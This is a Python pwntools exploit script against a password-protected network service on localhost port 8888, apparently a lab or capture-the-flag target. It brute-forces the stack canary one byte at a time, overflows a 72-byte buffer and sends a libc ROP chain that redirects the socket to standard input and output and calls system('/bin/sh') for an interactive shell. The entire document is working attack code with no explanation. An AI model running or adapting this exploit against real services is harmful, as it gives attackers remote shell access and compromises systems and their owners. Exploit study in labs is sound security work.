from pwn import *

context.update(os = "linux", arch = "amd64")

buffer = b'A'*72
payload = buffer

def exploit(payload, interactive=False):
	try:
		r = remote("localhost", 8888, level='error')
		r.sendafter(b"Password: ", payload)
		recv_data = r.recv(100, 0.1)
		if(recv_data == b"Invalid Password"):
			return True
	except EOFError:
		return False
	finally:
		if interactive:
			r.interactive()
		else: 
			r.close()

def leak_bytes(payload, name):
	leak_bytes = []
	progress = log.progress(name, level=logging.WARN)
	for i in range(8):
		for k in range(0,256):
			if(exploit(payload + p8(k))):
				payload = payload + p8(k)
				leak_bytes.insert(0, hex(k))
				progress.status(repr(leak_bytes))
				break
	log.info(f"Leaked {name} = {hex(u64(payload[-8:]))}")
	return payload

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') 
libc.address = 0x007ffff7dce000
rop = ROP(libc)
rop.dup2(4, 0)
rop.dup2(4, 1)
rop.dup2(4, 2)
rop.system(next(libc.search(b"/bin/sh")))
payload = leak_bytes(payload, "Canary")
payload += p64(0xBADC0FFEE0DDF00D) 
sys = p64(libc.sym.get("system"))
exit = p64(libc.sym.get("exit"))
binsh = p64(next(libc.search(b"/bin/sh")))

# log.info(f"ROP Chain:\n{rop.dump()}")

payload += bytes(rop) + sys + exit + binsh
exploit(payload, True)
